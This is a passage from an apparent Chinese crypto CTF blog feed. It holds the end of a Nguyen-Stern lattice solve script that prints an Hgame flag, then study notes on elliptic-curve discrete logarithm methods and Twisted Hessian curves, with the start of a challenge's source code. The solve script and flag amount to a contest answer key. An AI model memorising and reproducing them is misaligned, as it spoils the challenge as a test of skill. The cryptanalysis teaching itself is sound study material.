class="hljs-number">2895051855443032500114264954131824950223016860747135906862021873334133780972247856024289082902593614686234940918908254535652058807083890041131819711987908379837879596740736424457497974785551048832507207236105596543909624181876322785</span>, <span class="hljs-number">4966900790205893074984989386646008103784297431600598682180814393416207374789387128394225554960559580907084765584389900080293673527269787068249734379554225965935987198682993924271078260562548541634568301366120953043703261984185035492</span>, <span class="hljs-number">1592133000317447857415093607791358078761029097913126706492340352416015371109359886156333987922914888082815145772272973546014967400910445408277918663315594917464634596929536938549199769536365664240519962382595777686556467574333228524</span>, <span class="hljs-number">17035537442662976504922683848715751125264550470049558142661773195755584861517729792053865084739966511957660313727319368149881218522960763762882305808684597990343444747248688404053255935943475864000546643886973794872661260510687280843</span>, <span class="hljs-number">20111698260990344511260405765344080240651285550598954249450996243164491354537997138010932667983387259244493313206064965234304942238230370889100484896673506193390990108890409994241977323914015682399152387423870735159707545233977076770</span>, <span class="hljs-number">4426576652391016795551419713890251009257497077843566944171223794376085011499334139845631881967064569788805218564609553883159372200439972546448048186839777176955653678061337638263702524915401358923560309463124850203968200337852733276</span>, <span class="hljs-number">3556250500712518687819416837629333029165286228062203447561280347508137816614314590932355942707292725328412737236278928580181418156388443710572944973186708461884059491603304783359925238797793594138717291455747294198397870200166947926</span>, <span class="hljs-number">13927320217504747590335052600456317522959386643781341454614326945183478241960544334007376807495121099323703009105189096866855842836770860884311107587040596788037191865762444816790052342380928760217895549688851330716204287404367303487</span>, <span class="hljs-number">19186706038001453829669717777125450932916146002197133081093772142153667138769734136853279989523987832968428625917578008444184262747837927970709245398651581065254203234844684953377568872969107656958355470030477893423131898072422756183</span>, <span class="hljs-number">22381665099391547182936913521847282760348471609353024967760382743808171185913404603975224381726387826288857667025325668082188366555603105557245157448683625346209348265965221897830928437651540759787451097803683602952136978886939848108</span>, <span class="hljs-number">23184966822032599428052602150557101983764751770509578032863780766266522607517592773626111822041493293258042973530264981559695260799033791203372990411009256833559380777212487382283059963062596935284684661031645172162024478226204363138</span>, <span class="hljs-number">16539088490461420703816947102632424948425515660257887809146011235917654678378412523179508616742234368055968310509283732191870030434582732164093099360112011742236459025255884663476536960498964609417125524793004880729910317951965592813</span>, <span class="hljs-number">10627113729566322150048832232683529097355980196490682036544275502457617404334634120165915692104820767017442741956545228542857367270650462946535492128265700535237871862208669509649325009158507616860442008149873107060741021076888884760</span>, <span class="hljs-number">11267125954054697421607144060487028030315221416724761783980425416225401414438268312062546288659852252620731439408156918787311722449792469512045947674206376022808235573921725655145722130002570628702790325686485651094520806647889697625</span>, <span class="hljs-number">4911205202815908515692837431520549683777169253252777007455111883806834073795531698553219580184313225825960948113399800474452261317070334272323032740707835989017948524378048478488428489385565965079763692393689501989320254467985218131</span>, <span class="hljs-number">18225583119089116078692515199163462711367659128624273031302797819688898542857154391879994381461943991555355016609793957171277566919134542789018572504987813438201233787367785338009025648567150953656694093846485220700745696812633035006</span>, <span class="hljs-number">17124234213957098698230284828489924705668475635880795070226911783064579553649755246615473501361642779526435236563455406701400112606551296644981809412927868935422016140603302419472851331702007217744308865951784508265319879878806395169</span>, <span class="hljs-number">18320622251591902268884471566945908729088619624449744135372454032601565510002933121047617779525906112324014260307172465674892213050531659488423104916770768335565948080253402637642044778885182266582275200106953222049633752308706688551</span>, <span class="hljs-number">24457930433564457945771787755968680104666213881444206925098794328782195040157980540838735926561759082225194223736014415351949112479640317187344000165121092686793374287372748091561901721804318156288437459491612736032622243568349516093</span>, <span class="hljs-number">22265804749164546901938171648091768389896829971403003545856878651484500077757482148788299901736948904123686203689202942240180132163143143705283033061770635205827882648633512344457848245098258829095489702543948367764867928232044824058</span>, <span class="hljs-number">18900161492491534779787443646293787626820709943533292051383245169379565231395076945117775620635775969975846765953606343974869577606827971998219045983071563019684594799478738283866960338845191273042733578885765920385538754923673408889</span>, <span class="hljs-number">17889473980262621507727589927197778641872127889134833323841551214539716290976451403348274752633422499728496096883243584042483628894269754398553184329718324889293596658429101772287592368674172804565689105678473019975243407244443523354</span>, <span class="hljs-number">18138536284390228585222991677635066336042468881007408937551554888609804713475952148185850060713096062490706359461940944964671776206024172923126363065585750055088818712488848481717124019308269329827427616383247328426589265783755119376</span>, <span class="hljs-number">6941686913634391288204116641020549765180362394639046952833583665887465570267538795546804523595813342836355168483856050240026251188294030485167045415709628881383778040727359450383956568568106721584184411199839996521253684993422751259</span>, <span class="hljs-number">22992006670212126764824193120058634657001604914414004734821248527368854522227019382280730391923555175806134471061931935927053165225097789175365530407921340026367729574881159034848504162017932940755494323686314491075117479953225503887</span>, <span class="hljs-number">18889844572592402977165311575773286867467454462925891168417511513423729217044120249821731533209860082071111083322002901596453361922574290712584585358411669740150626541648939895944226132920890088469550610507895808585359727591914206085</span>, <span class="hljs-number">6666655710468005649706184115723573365251462187673059249738512161994399275840373987561227970751250766584800647042039279477404087065060050644628381828583861242380931211664820415435317452066274782819115003184163730581681622864948821194</span>, <span class="hljs-number">24442788363614702478160454433556682777614538285899274650364570324147929577042693651515379466649305846727056159265579376386821157221997188678366720354117931257791747671854293025636726315130814360325435461139608811317126380758851246545</span>, <span class="hljs-number">3789221993484155913559741664728461223403980965496397955689870284919836847677745452749044838420054969057924618819059401422484788710618185075911294609519545068730398520559177215399107660641538049803271554736571292247686379194750320543</span>, <span class="hljs-number">21873850228341807328959395050233093703169880159289173724757394227136978403580890202395540529330163397068220942284403794709107289189710029361455418998025336530860787357934895975567129810177776409058257987618326850995771554675384004597</span>, <span class="hljs-number">17536041541204934014076526920758665113043740624193969731730744258387807070596104489532717517216000563908854506010662434077584634386355186944716702706942442940731251780893620899779245846595551333147659316055919062256480970701655279627</span>, <span class="hljs-number">19407120068778690141403380026131453596861551386369479396230505390227653872677134054561992820557367774198282874395704720779245370294312934155682385859613278432890305085004312799356060179682815696304771052136896088704751922242630198409</span>, <span class="hljs-number">22188335278745941318611538342309792101807036715704960353260517879118066222777745210659900238277928630140699521308316838275971289200263131258234641581549364021537324405919384058988041517229292916261500788540253262281872145817866534201</span>, <span class="hljs-number">7747714826763088285107541247818316037397421767027668051138855493363116460000955397824452361102671411632490114848836371357604866226227424954470624642731987025316172767218592207709740356830011790713079523783872784305872540656392291746</span>, <span class="hljs-number">19887371972318133855851604678702556011249418604536222675471406387964064156556715238854177545520609871225101077916367584660715220549065088085292416996064161705548027357359433864169349493060754312050979210446959542252897590259359350334</span>, <span class="hljs-number">8294906413533132168404300931946413998240080166871907188094515783201644742263173979787881022523424957539034934314850416306063309934742997700326726155063016581522865298074769968348111017554707292410938898142597066728208428380878750421</span>, <span class="hljs-number">1653105970991953482899537672062357513065378236063390275343931334625408241297427898336232902361937430133831999674424825099913436268711104010735434651657677108868699978197850769122830586350740906726462895350121007949545664795947860864</span>, <span class="hljs-number">12269618263727745774471362344937708112433146558452944102120330036342787834859494830666143669909939653466690789351178557153188487424122505279563071471514459806106274249298197080596758790096134028357329959992410153187970554647619693992</span>, <span class="hljs-number">1872864619889940685338328801003331116116324125207518914355262445073138404081944205799436751349615602533951192776172397206414216844642872435584612569950411851258148106436686594672345335783969547344634731455993264276684131388107925671</span>, <span class="hljs-number">4513749312512251880604514209077948498027702413440182534839908928178574977910770106795841023217134659344590190863364646266789330386820741397846745980903894024071570509233767128940445989174470003283523091184905302986968451776421561662</span>, <span class="hljs-number">8603337256650354725901662878660176754144664298844747341704003399121600657022664528563551640960916587386129786478309164700432759539464086939903495957787444834354374817296692466731788081058771312703991550181427467022305370277303346983</span>, <span class="hljs-number">23365631034822686706848861837664149512381852299460219050905837202265319818470354800644904900148269920728421546208860389463045551971738217073763540025131975146762487532728885828048839528343788216251920714889888039142680073032018209305</span>, <span class="hljs-number">6607639177853302945854914419510931096388217686583645225143255416189057140379688783625576347008665489422690692808119043773336416572630490641290112319256251209477866830470853168722398019123553430625117729213654554816567713513779344415</span>, <span class="hljs-number">4561566327415935118011554902890982069222860765432388797764984409579792338453618355071397274166466983322420193457204472449461675131240004294130210782759565785798599897601429158065284397449217928577095159769164431353199244868487488744</span>, <span class="hljs-number">20619847566560770217922342108991907691804433910319321142515967407002608932724027977344243536552779741744666018384832452860273148472189048802133349097819957587715301234453466408609901385057101082861479087744559457433976694471408546305</span>, <span class="hljs-number">22491152451840917724221614919594852240132461240517952298400459039237731967027207477770343934142858535807374120125597482004629528875275878346918715932552067774911528110269427267812617484848108111673621932638514453993119718582330140747</span>, <span class="hljs-number">6666474094256099454100470843004001323138491057011536304234976312925807717978405285549794760174974472283543425259849525001185866616280751670606879171557999380642875418172376311718234199272738593712030842861381513444395743918038821115</span>, <span class="hljs-number">14608023366653031088088792776473398626003159629342147637827411108620737788956808756326109569015343711267053685351058998420052502241372531064676603977272048298276216817941298853114867422633812368586103057778170425202194117767754667631</span>, <span class="hljs-number">5252337957400533023141552935190055167419769967624364557832824989834270839854871010838982035707949070995760254952770763066280166814341995798204623431763701829339076952532980539368056515029226923915153022281011140366638060437110366739</span>, <span class="hljs-number">10904306109950562384969710342212030523791112657561334466651023805904078236093287424426677767985064640606514094696576993583613088268461193986220871599701879363215462244945655373954510358026604779860047706432984563536661200078510932373</span>, <span class="hljs-number">271089870966054382062547940599302930208391511305619529931792046885517009708743599677262187984628732739879872484565903195651986883825927888971937651058489837590922157961189702574478434079284762530056683899140620405502763587815843988</span>, <span class="hljs-number">3829615989110076770296742506036176782165844942888782102108951362367146757383686834342989617169804679903591543207522172730554226315074929853710799018658501869041610918943093181700178445519770897725094255926846625256047131752654342562</span>, <span class="hljs-number">21027069518507812270143295031343563349093839199401621816244376936177926406132628307142702486126954172154048366960790803112488498869107125453199712698252176721555768481489241348715849630405805925617213192771837043429514738827417144886</span>, <span class="hljs-number">5881226757843642195966565964653582492820888457331393664539176000660786662815235967860466787943573661827208152609810786722095379797141818015319613457329828625393487501781946972038205996869901009867952429000678385538000284430630706236</span>, <span class="hljs-number">2521923938150189454600306942991910693184006998559434655516630180847991419680039647290350012029220409131874146647660269259895592069243379722647318881158750588650781231049664374429790092745270054520174713929014178340596950439728274560</span>, <span class="hljs-number">8758376499045186974759666603979237567667197537852772637677888896808075273558089282554848789332514021133259149957700137612055862632797830595621934651217892115186467411149352513292138952986429910931491409905668759362630065098560911595</span>, <span class="hljs-number">13191199724136555502957890679396614709016857839416803538397351651347130464502168341817424021127860042268678297183870891307490573812114364969054434627925544210247121163167379363424886928897494782573687523127714204264997876190602437253</span>, <span class="hljs-number">9045856550177265391220629158731617749010212836864098283122546582777883404294009743353817729777617793271710052997379493755741026807844934814727246295235951284912102541728263662595501946149955917048457614526081296501462068421827852976</span>, <span class="hljs-number">6459798973338438966900179181532933692034227569421041783473328776170587260589076396376191246924415837088205177319039971420829034696713874472602132191625410039341612568435551413702295547566220164641447295285720082107354915094875081603</span>, <span class="hljs-number">18130944169824976249131646693653229887900178060915303504243600146230275474872733740668972937137157219543732643704650107251416696945179838232545698726143250813322229855629104391962459755248646534545048139897036809559137651958948270079</span>, <span class="hljs-number">19433961868269193358322214141454667980688775311251629909509283331435001571001860372018368696521955762539089964314003195187700700564577856756527331858387859373880454698968805785663462845204498347648129595364259940616740397244612865478</span>, <span class="hljs-number">8454342596590308643274924755539741595287236546135227564272399966865185286500856241479821014846217497777600310284414611127622114813445233725529927188907572438103992229319436467881065607514441060358976822819421059737228474840057614047</span>, <span class="hljs-number">14537166469005975467747810118162809545827718830406398577270708204918464068241632461987018145489192528509346426457951388255954213424031104985101166216842931291037542011588336951147195358280734815984408580846906869482480502971976426377</span>, <span class="hljs-number">9864795106799668524939736197424521439591891686815014975959473174387504259559952345678395376176078540246526852734596130277519239749484404961484185022437705083689017218701798637167021350243461787680837042187852481891194754984735656290</span>, <span class="hljs-number">12268133299486497651766039892370828813185008783433000037986132221788291415226868620238438503015954126875051172591613715198127704843911983953450929112840971801607634064818730678605607306766453120283358084710064351726230220427399762639</span>, <span class="hljs-number">23200293260215743474524683129751336070441250470963131048954888782126750470082228197816325916628408311922916070082220789486560209004492220118951431198612457889003386630810956350904331757934144293620423858054842692246457187748735062656</span>, <span class="hljs-number">12185058234910532038606592923943044720835384475056406568591532299474530796146503312961639492038042022391680648709583314649821462809663154713418981695840590138378051933292810301094804670835915971975595283960175012458013597273267021942</span>, <span class="hljs-number">11221105904027102766755866944349650081668300046041215931102172400146372526930032156540201468901690818353993076628146864056758574315777576911062494908066762717748155624173988281018555785467232120361958052665957065342986661851276430394</span>, <span class="hljs-number">14146479366643851658329966290610820831402901507964825251479961487541976561960526129163043068554159234344763780262866371744837633699714330248498751352953049997609901897424160840833140698818737335558582310519215832295749211043181569006</span>, <span class="hljs-number">1996209659684880945362862072520668750990547266260431838906384808543405104055069952622618300300584240886900690277630290717169515463002827197894865638271520372178286783553830032501282265213469285397161533556619830350317766403742420992</span>, <span class="hljs-number">18745628006242526136845741349836299919853199739283471770759301677399688289987875667803750091491715203157411890157519643639106751973250183741642640909721507627190884945027790857100678267316925707699884380178101491613670302697083954620</span>, <span class="hljs-number">19418124148220580953761208919068176633948651831328159315391336734636206569887918413082885761812646760978293757398100953133069513030393015847333774689093510445461709841109234535067235898760285824847288504459882411280759715216659582800</span>, <span class="hljs-number">5205682801846809078199714774495380248428185583858806868224581963484209052697538736798790170636398029956181045671089079103657022469597301960581764542974628895184611312183649377529274963873896667201796079779944709584465505596525070672</span>, <span class="hljs-number">23318768639095847871012848772328512763678546109012363992365106641654912272868317312950662675004405062658308032988874110659096548795362930763210615993811303468541570030170160830706399273680692451111580339813777985874728526448601728258</span>, <span class="hljs-number">17663789897713399391329553205656192714527376624862805232162724262629896080514601476156211759120575400809873039830798687701631183863013915733500151932198747020557039729241833096695716114234461112493415456068786767133227958219632605915</span>, <span class="hljs-number">6830010105417894382101110089036680793557109559922111774917409457675491199721642329811584508061936118348231576993991198201242451125213981421233318599225362440072543796138016876550674700452496965047853603139044680407212592626251990309</span>, <span class="hljs-number">20884460900376572824292657271126142123485873790799680755215209134586191820305715480424778276376315900396541154319924699294552460109641193882916333508408848926700539891286011495861364148628583978468945538773985039022758906702197824639</span>, <span class="hljs-number">13531065912700180655643696503956611973995564881435960456381267408672878851671401491817614667804495339344405932207053507762953305764605332944268933111663238888239497791369102852051383458023784915387358708364653218605556527945192953446</span>, <span class="hljs-number">2553816611900270571668114455889943878175117814334437639644905418648197398024478749479929249928897268004570330988939190446533589567173538978234848074204808696098346906993745527874980173125711310145943264700663446068878853419141256703</span>, <span class="hljs-number">7702946127422572691818763664478853337162137782960611620730689560076482803756508559755597150108497423141643340665369251108221062530372412417632117367040091322406174387044200677890005382248858884236589435161310662150368144113087162028</span>, <span class="hljs-number">856622736471280804557194626008729500444312593564382589268324938301776962060843602449805587925812237957752880785112568949132663694077910582967771689119118364920441406196093341412299290918890444268129746265100558792934176787213952281</span>, <span class="hljs-number">13085724187735251902990250756196209600908652053725281294139610919151379144531851103633380912533710102796299853358725400239404987942390816511761529807030939893292168306351094697881403177421950694992263386572648775597583744415784239571</span>, <span class="hljs-number">7100689265695650020381992634740648600984998939714583113848881850701106459614914817851311196581107346332066792064189719153254177748385971715393193581611667136269465698799421805822480100454812068626009149069638986161533799798537549504</span>, <span class="hljs-number">4467099588802620474242283665232546701197788121100881304650783900944358367934303538647332945119694362849091301355005436291078223280753310654713741596387831313076907729367513905299597582977894859084467382251110232442313588731567517722</span>, <span class="hljs-number">5473046296972118327495477534670327059922805992783858593704621531789283121351554409848948934507912406403962506436068909023098369828879491079777608783858939477692990976926108359125684410236904067532064874993279097186185155662101906258</span>, <span class="hljs-number">13591367045303817756921606989622272393926672486200768156018816106702906007663207108105253090224421463114966486892454772900918694500736413865138170304122425783415795355698366106633741954984452451151018930441346568620455282531777867950</span>, <span class="hljs-number">12837435207992697390990569032560187426481997222586386722777778699242138971828789676884863577995903428553893241998604229610814215105950418432582043279620338868532002049158799146484208974875466555076583060832418045530228962180626040480</span>, <span class="hljs-number">7316640175294137713314869727957150382096738798129711776743606346914726499175960701433782404417244551378443800105185050713536694756151112399465628411989410218214135853671061537891268154389537857467508049690878544281069813159134447208</span>, <span class="hljs-number">5151376884557358987102680932801796401429637582605742653829100435795121709703076330975777361528309737649265350014534395043422641886613936452263244119523616000835976669901180725907500239783554884160601160568746329677044574260523365548</span>, <span class="hljs-number">5544576622940386549335576865087877596617926099466042134500548634035376720895126959440244093852186422501431889949044217654362265128303553015621478863491100875988057958166746762260378217552569885430432535094758534858841379918068187007</span>, <span class="hljs-number">14799083878004905781143009556442469081112262413659889639288955718256084634190461545010854679353463115437573577978160713007284612958005397981521383647283702964407693130299777274799243953236030640570493768398572551239990227306733506160</span>, <span class="hljs-number">132844788313325827023495191003662944917431930932901448945118978538428738126330451739237066558502122063099809045229187297346109539648216961234175022847902983869276754945800449898074085412283494856067025963252580204722767954611258179</span>, <span class="hljs-number">9997725379291207116745319316287400946107564644091980910563413554119585263470477093970564227161564056288461504072778119028907789906500076760472149102049287538406258735529830965640424425566731939511108199132607994947515509428756592559</span>, <span class="hljs-number">14646376958061531925518831995658673407931262101501970446265549357832773749183019186120219286620900718201222809743448147362429133751090137661872964022623647740154174784462365444772177633656555414706757146904500779085225231797377050144</span>, <span class="hljs-number">16961346690251629621986345424487239681148326635080182277543308482323385918405862092823934592459138523058683934777987371593649364181974320355468882733898473293716092586268920136699107300230769779047091693711423641803330962855097096925</span>, <span class="hljs-number">2618594245402239609420638325588710628729298505557767536783081437084561636188823448848608313088279895767614513680617644960939796227640357345879653043764575378231433481016175403223796690453962090038403036583909367766156025584252164203</span>, <span class="hljs-number">16129071855649587728956130797915283397821444682369014639788931828703405001025452386772618008541361124591860437269977673096643234091339097919538256670714042876788038021148787313041232229195101391115617710413115586617903468179658293636</span>, <span class="hljs-number">9296460193370583816070265591004199836116409032475859821958373154648206416256688852532615798871909770401306092671009539709487113538354105710364096048695663733075506988691991440779198012260316123759636997605427235081435477049705160552</span>, <span class="hljs-number">1356766159480311231046092117641588893355352105595481615726950290176811339998878309107970938869998059989877968402614403581962019949583734460209881480875822282448127936842922015950977040552638984243226561237288675211033594559512352433</span>, <span class="hljs-number">19197695297715405687227248527900901092786200526800375602428770624109373871809940359427277921210632597272639018938714964263079621574904896862536158251668755864087715415463131002786745060027810126535070270462254705453473599741763642828</span>, <span class="hljs-number">11504919294119244522634617029097854228866432223952020614427505589799731544252763714133524362716131837287869956783968056158486948361614604723869397483955281379172665969413312233383788159684735115665749332738234882920695449340309379522</span>, <span class="hljs-number">18136748881313347797489256490303008973958797121502583070872297973410283357173931060145003395290313809639159364452878423212404968100529416632370960280991488248897643385077173546644657216962479904853980225967792378564740955618790869689</span>, <span class="hljs-number">22555443333166977522691347301347007560400051480503434282172981846969595435546624498334336147388425749569732805395419970503066627849315134643618856767862223712319227590572187001545137380352712433069385477809940371396279834624165048444</span>, <span class="hljs-number">19332410102472644041731759226399070707013106727087481077728390364392367890410961009071561108596168685943298518353047413086954964804844094391018967334543408778135737715163542892702469367908397906585577557910294555212057020330243744038</span>, <span class="hljs-number">17177417284468945229490862308619539417109492506914913062877431832846296734201442477935598961820079857431068892933310664489209467455843404117024994948398426037991145460135427180175565761835499766689618253941365562391662494080561342044</span>, <span class="hljs-number">879611534766674063001632328710680301710464497091520920338941691285492779988149399177086528073474651179894297281827841186309099576047175634809922453338033325127493237666384356566986210156156953604218009901589731044248652021118031620</span>, <span class="hljs-number">23901207038202622707599557245612794049853792927287360450027492049407851837113641371314557090659548570609882944974639719117613653182109642059819516444307658547936689472901123537159776992389462316392381501838566991389570490374017025518</span>, <span class="hljs-number">7294655103119575652652322286451546582028529239995283561722077129773315845389577738996103704019032108880990669128684769525902413906863125164280686381766699292160785541839733876768365575818004233647829515890263347139003166333882303265</span>, <span class="hljs-number">8199949148068603717078157517861527127346508355755818050198576663971835822831527608360661637977726638149791394376076411543777469889828576151097728735193348069053034445800818498132875303434000618724830859612380606691308333135184789022</span>, <span class="hljs-number">12932127055873709636118977200718753643697619875736929170699115793566554057840448101626698069421491300195262169693063575726920790612681778762496689371363586507749098405216335541209813518577176560833970043581650697105699549343835699165</span>, <span class="hljs-number">9917293893368177421397475427602509319278773672321383411846980082270699518174858223780569843589979834443168760567064326549648560205061679870738748816216468066517782541276129041173215780179108422815701857032247139868407259633376154559</span>, <span class="hljs-number">6485828831888305306081814677813540588127941945945034779245913009780868830245510314875533356179894354966906340154886875373143060627077170845158967404313883218225671724777853809740370308868692781589580666606866945869996719967294318732</span>, <span class="hljs-number">19119951246631217104039346142695133667127595492295413599863780403588391811741379549048868909966290463800864082020118315313386877862668618823502190910178365164478013264098319748585627290011516370646420391829298524728641913535537536764</span>, <span class="hljs-number">13215772369693604102761934975932281069170694713655356522695565074039936506383846119163879883348265869353744569056003177315023138985010016601208933546975222998897707503967398686672700803569601825514347043442257463097499547507964305449</span>, <span class="hljs-number">1824804736849693701490461807874708098331129810367417218087931080176315035870555627969047286436604549231593492189121553958901210913466534815129733115561941853007429568739121822292088591127010504328963864942012956577043433126898293277</span>, <span class="hljs-number">6776240363305734174388141780584391816477723528084755437932934198907331150157541368203589425111306785868566064140117304971940704620271781717831300158164114203169466745769627304177491937036545708540956189334174616021603617610568750468</span>)        <span class="hljs-comment">#给定最终向量</span><br><br>Lx, va = Nguyen_Stern(h, m, n, M)<br><br>ans=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Lx:<br>    ans.append(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>,i)),<span class="hljs-number">2</span>)))<br><br><span class="hljs-comment">#print(&quot;向量a:&quot;,va)</span><br><span class="hljs-comment">#print(&quot;矩阵x:&quot;,Lx)</span><br><span class="hljs-built_in">print</span>(ans[-<span class="hljs-number">1</span>])<br><span class="hljs-comment">#b&#x27;hgame&#123;U_f0und_3he_5pec14l_0n3!&#125;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto随笔扫盲</title>
    <link href="/2025/02/28/Crypto%E9%9A%8F%E7%AC%94%E6%89%AB%E7%9B%B2/"/>
    <url>/2025/02/28/Crypto%E9%9A%8F%E7%AC%94%E6%89%AB%E7%9B%B2/</url>
    
    <content type="html"><![CDATA[<h2 id="ECDLP（椭圆曲线上的离散对数问题）"><a href="#ECDLP（椭圆曲线上的离散对数问题）" class="headerlink" title="ECDLP（椭圆曲线上的离散对数问题）"></a>ECDLP（椭圆曲线上的离散对数问题）</h2><p> <strong>概念：</strong> 给定素数 p 和椭圆曲线 E，对于 Q&#x3D;k*P，在已知 P,Q 的情况下求出小于 p 的正整数 k。可以证明由 k 和 P 计算 Q 比较容易，而由 Q 和 P 计算 k 则比较困难。</p><p> <strong>方法：（类似DL问题）</strong></p><ul><li><p><strong>暴力搜索（Brute Force）</strong>：适用于小规模，k比较小</p></li><li><p><strong>Pollard’s Rho 算法</strong>：适用于群的阶较大。这是一种概率性算法，基于随机游走和生日悖论，复杂度为$O(\sqrt{n})$，其中 n 是群的阶。结合中国剩余定理（CRT）组合结果。</p></li><li><p><strong>Pohlig-Hellman 算法</strong>：适用于阶可以分解为多个小素数的幂。</p></li><li><p><strong>Baby-Step Giant-Step 算法（小步大步法）</strong>：通过预计算和查找表的方式将问题分解为两个部分，复杂度为$O(\sqrt{n})$，需要较大的存储空间。</p></li></ul><p> <strong>代码：</strong></p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br>p = <br>a = <br>b = <br>E = EllipticCurve(GF(p),[a,b]) <span class="hljs-comment">#Weierstrasss形式（椭圆曲线标准形式）</span><br>P = E(, ) <br>Q = E(, ) <br>k = discrete_log(Q, P, operation=<span class="hljs-string">&#x27;+&#x27;</span>) <br><span class="hljs-comment">#或 discrete_log_rho(a,base,ord,operation)</span><br><span class="hljs-comment">#或 bsgs(base,a,bounds,operation)</span><br><span class="hljs-comment">#或 k = Q.log(P)</span><br><br><span class="hljs-built_in">print</span>(k)<br></code></pre></td></tr></table></figure><h1 id="TH曲线-Twisted-Hessian-Curves"><a href="#TH曲线-Twisted-Hessian-Curves" class="headerlink" title="TH曲线 (Twisted Hessian Curves)"></a>TH曲线 (Twisted Hessian Curves)</h1><p> <strong>一般方程：</strong></p><p> $ax^3+y^3+1&#x3D;dxy$</p><p> <strong>加法：</strong></p> <span> $$ (x_1,y_1)+(x_2,y_2)=(\frac{x_1-y_1^2x_2y_2}{ax_1y_1x_2^2-y_2},\frac{y_1y_2^2-ax_1^2x_2}{ax_1y_1^3-y_1}) $$ </span><p> <strong>倍乘：</strong></p> <span> $$ 2(x_1,y_1)=(\frac{x_1-y_1^3x_1}{ay_1x_1^3-y_1},\frac{y_1^3-ax_1^3}{ay_1x_1^3-y_1}) $$ </span>  <p> <strong>取反：</strong></p><span>  $$ -(x_1,y_1)=(\frac{x_1}{y_1},\frac{1}{y_1}) $$ </span>  <p> <strong>构造方法：</strong></p><p> 将原方程转化成<strong>齐次三次方程</strong>，令$x&#x3D;\frac{x’}{z},y&#x3D;\frac{y’}{z}$，</p><p> 原式变为$ax’^3+y’^3+z^3&#x3D;dx’y’z$，</p><p> 然后利用</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">cubic = a*x^<span class="hljs-number">3</span> + y^<span class="hljs-number">3</span> + z^<span class="hljs-number">3</span> - d*x*y*z<br>E = EllipticCurve_from_cubic(cubic, morphism=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p> 便可将三次曲线（cubic）转换为椭圆曲线的标准形式（Weierstrass形式）的函数。</p><p> <strong>例题：</strong></p><p> <strong>（Hgame 2025）Intergalactic Bound</strong></p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_THCurve</span>(<span class="hljs-params">P, Q</span>):  <span class="hljs-comment">#曲线加法</span><br>    <span class="hljs-keyword">if</span> P == (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">return</span> Q<br>    <span class="hljs-keyword">if</span> Q == (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">return</span> P<br>    x1, y1 = P<br>    x2, y2 = Q<br>    x3 = (x1 - y1 ** <span class="hljs-number">2</span> * x2 * y2) * <span class="hljs-built_in">pow</span>(a * x1 * y1 * x2 ** <span class="hljs-number">2</span> - y2, -<span class="hljs-number">1</span>, p) % p<br>    y3 = (y1 * y2 ** <span class="hljs-number">2</span> - a * x1 ** <span class="hljs-number">2</span> * x2) * <span class="hljs-built_in">pow</span>(a * x1 * y1 * x2 ** <span class="hljs-number">2</span> - y2, -<span class="hljs-number">1</span>, p) % p<br>    <span class="hljs-keyword">return</span> x3, y3<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul_THCurve</span>(<span class="hljs-params">n, P</span>):  <span class="hljs-comment">#曲线乘法</span><br>    R = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">while</span> n &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>            R = add_THCurve(R, P)<br>        P = add_THCurve(P, P)<br>        n = n // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> R<br><br><br>p = getPrime(<span class="hljs-number">96</span>)<br>a = randint(<span class="hljs-number">1</span>, p)<br>G = (randint(<span class="hljs-number">1</span>,p), randint(<span class="hljs-number">1</span>,p))<br>d = (a*G[<span 